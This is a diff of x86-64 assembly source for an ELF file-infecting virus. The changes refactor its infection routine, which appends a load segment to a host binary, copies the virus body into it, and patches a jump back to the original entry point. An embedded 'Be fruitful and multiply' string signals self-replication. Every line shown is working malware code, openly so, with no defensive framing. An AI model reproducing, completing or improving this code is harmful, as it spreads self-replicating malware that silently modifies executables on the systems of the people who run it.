@@ -95,7 +95,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
         db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
         db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
         db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
-        db	0x74, 0x66, 0x69, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
+        db	0x74, 0x66, 0x75, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
         db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
         db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
         db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
@@ -202,7 +202,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   ; save entry
   mov     rax,  [rax + elf64_hdr.e_entry]
-  mov     [rsp + 0x10], rax
+  mov     [rsp + VX_CTX.qOldEntry], rax ; 0x10
 
   ;; LOOP THROUGH PHDR >----------------------------------------------------<
 
@@ -216,7 +216,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     imul    rbx,  rcx                                 ; phentsize * i
     
     lea     r12,  [rax + rbx]
-    mov     [rsp + 0x18], r12                         ; store prog_hdr on stack
+    mov     [rsp + VX_CTX.qPrgHdr], r12               ; store prog_hdr on stack
 
     movzx   rbx,  word [rax + rbx]                    ; rbx = *(phoff + (phentsize * i))
     
@@ -236,7 +236,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   dword [r12 + elf64_phdr.p_type],  PT_LOAD       ; p_type
   mov   dword [r12 + elf64_phdr.p_flags], PT_FLAG_RX    ; p_flags
 
-  GetVirusSize                                          ; rcx = size V-Body
+  mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
   add   rcx,  SZ_JMP_OEP                                ; place 4 "jmp OEP" patch
 
   mov   qword [r12 + elf64_phdr.p_filesz],  rcx         ; p_filesz
@@ -245,7 +245,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   qword [r12 + elf64_phdr.p_offset],  r10         ; p_offset
 
   mov   rbx,  r10                                       ; rbx = size H-Body
-  mov   dword [rsp + 0x20], ebx
+  mov   dword [rsp + VX_CTX.qEof], ebx
   add   rbx,  0xc000000
 
   mov   qword [r12 + elf64_phdr.p_vaddr],   rbx         ; p_vaddr
@@ -254,13 +254,13 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   ;; WRITE SELF AT LOCATION >-----------------------------------------------<
 
-  GetVirusSize                                          ; rcx = size V-Body
+  mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
 
   sub   rsp,  0x8
   push  rdi
 
-  mov   rsi, _start                                     ; src address
-  mov   rdi,  [rsp + 0x10]  
+  lea   rsi,  [rel _start]                              ; src address
+  mov   rdi,  [rsp + VX_CTX.qMappedBin + 0x10]  
   add   rdi,  r10                                       ; dest address
   rep   movsb
 
@@ -269,15 +269,15 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
-  GetVirusSize                                          ; rcx = size V-Body
+  mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
 
   mov   rbx,  [rsp]   
-  add   rbx,  [rsp + 0x20]
+  add   rbx,  [rsp + VX_CTX.qEof]
   add   rbx,  rcx
 
   mov   byte  [rbx + 0],    0x48
   mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
-  mov   rcx,  [rsp + 0x10]                              ;                |
+  mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
   mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
   mov   byte  [rbx + 10],   0xFF 
   mov   byte  [rbx + 11],   0xE0                        ; jmp rax
@@ -298,7 +298,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   sub   rsp,  0x8
   push  rdi
 
-  MSync rdx, [rsp + 0x18], MS_SYNC                        ; msync(addr, len, MS_SYNC)
+  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC     ; msync(addr, len, MS_SYNC)
 
   pop   rdi
   add   rsp,  0x8
@@ -309,7 +309,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ; fsync(fd) - just to make sure
   FSync rdi                                               ; fsync(fd)
 
-  MUnMap  [rsp], [rsp + 0x8]                              ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
 
   xor     rax,  rax                                       ; return 0
   mov     rsp,  rbp
@@ -317,7 +317,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ret
 
   .InfectCleanUp:
-  MUnMap  [rsp], [rsp + 0x8]                              ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
 
   .InfectFailureExit:
   xor     rax,  rax                                       ; return 1
